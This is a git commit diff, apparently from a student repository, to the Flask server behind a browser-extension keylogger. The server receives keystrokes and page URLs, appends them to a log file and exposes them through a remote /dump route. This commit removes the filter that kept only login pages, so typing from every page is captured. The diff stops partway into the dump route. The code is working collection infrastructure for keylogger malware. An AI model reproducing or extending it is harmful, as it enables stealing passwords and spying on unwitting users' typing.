680d46d7fff91caaefdf96ef7b39c4e455bdac4c
z5360175 <caleb.watts@student.unsw.edu.au>
2022-04-13 20:53:20 +1000

    Add method to create logfile if not exist

--- server/server.py
+++ server/server.py
@@ -1,6 +1,6 @@
 """ Keylogger/server/server.py
 
-    This is a Python Flask Server to capture the keystrokes 
+    This is a Python Flask Server to capture the keystrokes
     and corresponding webpage from the keylogger extension.
 """
 import json
@@ -10,36 +10,53 @@ from flask_cors import CORS
 APP = Flask(__name__)
 CORS(APP)
 
-# Destination route for logs from the extension. 
-# Recieves a POST request with a body of:
-# {
-#   page : URL String
-#   key  : Keypress string
-# }
+def check_log_exists_and_create_log():
+    print("Checking")
+    try:
+        logfile = open("log.json")
+    except FileNotFoundError:
+        print("No log file, creating log")
+        logfile = open("log.json", "w")
+        empty_log = {}
+        logfile.write(json.dumps(empty_log))
+        logfile.close()
+
+""" Destination route for logs from the extension. 
+    Recieves a POST request with a body of:
+    {
+        page : URL String
+        key  : Keypress string
+    }
+"""
 @APP.route("/keylogger", methods=["POST"])
 def recieve_log():
     request_body = request.get_json()
     url = request_body["page"]
     key = request_body["key"]
-    if "login" in url:
-        with open("log.json") as logfile:
-            log = json.load(logfile)
-            if url in log.keys():
-                log[url] += key
-            else:
-                log[url] = key
 
-        json_object = json.dumps(log, indent = 4)
-        with open("log.json", "w") as logfile:
-            logfile.write(json_object)
-    return json.dumps({})
+    check_log_exists_and_create_log()
 
-# Route to access the log remotely. 
-# Recieves a GET request with the server returning the log.json file:
-# {
-#   "URL" : "Keypresses"
-#   ...
-# }
+    # if "login" in url:
+    with open("log.json") as logfile:
+        log = json.load(logfile)
+        if url in log.keys():
+            log[url] += key
+        else:
+            log[url] = key
+
+    json_object = json.dumps(log, indent = 4)
+    with open("log.json", "w") as logfile:
+        logfile.write(json_object)
+    return ""
+
+"""
+    Route to access the log remotely. 
+    Recieves a GET request with the server returning the log.json file:
+    {
+        "URL" : "Keypresses"
+        ...
+    }
+"""
 @APP.route("/dump", methods=["GET"])
 def dump_log():
     dump = """
